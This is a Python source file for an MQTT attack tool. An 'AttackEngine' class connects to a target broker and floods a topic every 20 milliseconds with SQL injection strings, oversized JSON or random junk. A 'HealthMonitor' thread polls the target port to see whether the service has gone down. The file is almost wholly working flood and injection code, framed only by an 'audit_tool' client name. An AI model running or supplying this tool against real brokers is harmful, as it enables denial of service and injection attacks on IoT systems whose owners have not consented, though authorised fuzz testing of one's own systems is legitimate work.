import paho.mqtt.client as mqtt
import random
import time
import threading
import string
import socket
import json

class HealthMonitor:
    def __init__(self, target, port, status_callback):
        self.target = target
        self.port = port
        self.callback = status_callback
        self.running = False

    def _check(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target, self.port))
                sock.close()
                self.callback(result == 0) # True if alive
            except:
                self.callback(False)
            time.sleep(1) 

    def start(self):
        self.running = True
        threading.Thread(target=self._check, daemon=True).start()

    def stop(self):
        self.running = False

class AttackEngine:
    def __init__(self, target, port, topic, attack_type, logger):
        self.target = target
        self.port = port
        self.topic = topic
        self.attack_type = attack_type
        self.logger = logger
        self.running = False
        self.client = mqtt.Client(client_id="audit_tool_v2")

    def _get_payload(self):
        if self.attack_type == "SQL_INJECTION":
            return random.choice(["' OR '1'='1", "admin' --", "UNION SELECT 1,2,3--"])
        elif self.attack_type == "JSON_FLOOD":
            return json.dumps({"overflow": "A" * random.randint(100, 5000)})
        else: # RANDOM_JUNK
            length = random.randint(10, 1024)
            chars = string.ascii_letters + string.digits + "!@#$%^&*"
            return ''.join(random.choice(chars) for _ in range(length))

    def _loop(self):
        try:
            self.client.connect(self.target, self.port, 60)
            self.logger(f"CONNECTED TO {self.target}")
            
            while self.running:
                data = self._get_payload()
                try:
                    self.client.publish(self.topic, data)
                    self.logger(f"SENT [{self.attack_type}]: {len(data)} bytes")
                except Exception as e:
                    self.logger(f"ERROR: {str(e)}")
                time.sleep(0.02) 
                
        except Exception as e:
            self.logger(f"CONNECTION FAILED: {str(e)}")
            self.running = False

    def start(self):
        if not self.running:
            self.running = True
            threading.Thread(target=self._loop, daemon=True).start()

    def stop(self):
        self.running = False
        if self.client.is_connected():
            self.client.disconnect()
        self.logger("STOPPED")